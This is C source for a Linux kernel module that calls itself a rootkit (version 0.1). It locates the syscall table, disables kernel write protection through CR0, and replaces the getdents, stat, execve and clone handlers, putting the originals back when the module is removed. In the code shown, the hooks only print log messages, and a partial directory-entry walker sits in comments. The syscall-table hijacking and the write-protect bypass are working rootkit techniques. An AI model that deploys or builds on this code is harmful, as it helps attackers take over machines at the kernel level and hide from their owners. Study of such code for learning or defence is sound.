#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <asm/paravirt.h> // write_cr0

#include "helper.h"

#define HOOK_GETDENTS 	1
#define HOOK_STAT 		0
#define HOOK_EXECVE		0
#define HOOK_CLONE		0

#define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
#define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Klecko");
MODULE_DESCRIPTION("Rootkit by Klecko");
MODULE_VERSION("0.1");

unsigned long *syscall_table = NULL;


asmlinkage long (*sys_getdents_orig)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	//don't fucking put a print right here or it will crash for some reason

	long leidos = sys_getdents_orig(fd, dirent, count);

	/*if (dirent != 0)
		//printk(KERN_INFO "ROOTKIT: sys_getdents: Fd: %u. Count: %u. Ino: %lx. Off: %lx. Reclen: %hx. Name: %s\n", oldfd, count, dirent->d_ino, dirent->d_off, dirent->d_reclen, dirent->d_name);
		printk(KERN_INFO "ROOTKIT: sys_getdents: Fd: %x. Possible fd: %lx\n", fd, possible_fd);
	else
		printk(KERN_INFO "ROOTKIT: sys_getdents null dirent!?!?!?!\n");*/

	/*int n, buff_offset;
	struct linux_dirent* actual;

	n = 0;
	buff_offset = 0;
	actual = dirent;
	while (buff_offset < 1){
		printk(KERN_INFO "ROOTKIT sys_getdents we're at offset %d\n", buff_offset);
		buff_offset + actual->d_off;
		actual = (struct linux_dirent*)((char*)actual + actual->d_off); //casting needed for increasing exactly d_off bytes
		n++;
	}
	printk(KERN_INFO "ROOTKIT sysgetdents read %d entries!", n);*/
	printk(KERN_INFO "ROOTKIT: Hello from sys_getdents\n");
	return leidos;
}

asmlinkage long (*sys_stat_orig)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
asmlinkage long sys_stat_hook(const char __user *filename, struct __old_kernel_stat __user *statbuf){
	printk(KERN_INFO "ROOTKIT: Hello from sys_stat\n");
	return sys_stat_orig(filename, statbuf);
}

asmlinkage long (*sys_clone_orig)(unsigned long a, unsigned long b, int __user * c, int __user * d, unsigned long e);
asmlinkage long sys_clone_hook(unsigned long a, unsigned long b, int __user * c, int __user * d, unsigned long e){
	printk(KERN_INFO "ROOTKIT: Hello from sys_clone\n");
	return sys_clone_orig(a,b,c,d,e);
}


asmlinkage int (*sys_execve_orig)(const char* filename, char *const argv[], char *const envp[]);
asmlinkage int sys_execve_hook(const char *filename, char *const argv[], char *const envp[]) {
	pr_info("ROOTKIT: hooked call to execve(%s, ...)\n", filename);
	return sys_execve_orig(filename, argv, envp);
}




//__init para que solo lo haga una vez y después pueda sacarlo de memoria
int __init hooks(void){
	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
		printk(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
		return -1;
	}
	printk(KERN_INFO "ROOTKIT: Syscall table found at %lx\n", (long unsigned int)syscall_table);
	printk(KERN_INFO "ROOTKIT: Starting hooks\n");

	sys_getdents_orig = (void*)syscall_table[__NR_getdents];
	sys_stat_orig = (void*)syscall_table[__NR_stat];
	sys_execve_orig = (void*)syscall_table[__NR_execve];
	sys_clone_orig = (void*)syscall_table[__NR_clone];

	ENABLE_WRITE();
	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_hook;
	if (HOOK_EXECVE) syscall_table[__NR_execve] = &sys_execve_hook;
	if (HOOK_STAT) syscall_table[__NR_stat] = &sys_stat_hook;
	if (HOOK_CLONE) syscall_table[__NR_clone] = &sys_clone_hook;
	DISABLE_WRITE();

	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
	return 0;
}


void __exit unhooks(void){
	ENABLE_WRITE();
	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_orig;
	if (HOOK_EXECVE) syscall_table[__NR_execve] = sys_execve_orig;
	if (HOOK_STAT) syscall_table[__NR_stat] = sys_stat_orig;
	if (HOOK_CLONE) syscall_table[__NR_clone] = sys_clone_orig;

	DISABLE_WRITE();
}
//insmod
static int lkm_init(void){
    printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
    return hooks();
}

//rmmod
static void lkm_exit(void){
	unhooks();
    printk(KERN_INFO "ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

